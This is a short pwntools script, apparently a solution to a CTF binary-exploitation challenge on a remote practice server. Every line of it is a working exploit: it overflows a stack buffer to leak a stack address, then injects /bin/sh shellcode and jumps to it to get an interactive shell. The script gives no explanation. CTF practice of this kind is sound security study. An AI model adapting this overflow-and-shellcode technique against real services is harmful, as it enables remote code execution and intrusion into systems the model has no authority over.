from pwn import *
context.log_level = 'debug'
context.arch = 'i386'
# io = process('./pwn')
io = remote('node4.buuoj.cn', 26107)

payload = cyclic(20)
payload += p32(0x804808B)

io.sendafter(b'Let\'s start the CTF:', payload)
io.recvuntil(p32(0x804808b))
stack_addr = u32(io.recv(4))

payload = asm(shellcraft.sh())
payload += p32(stack_addr + 0x14)
payload += asm("sub esp, 0x100;"
               "jmp ecx;")

io.send(payload)
io.interactive()
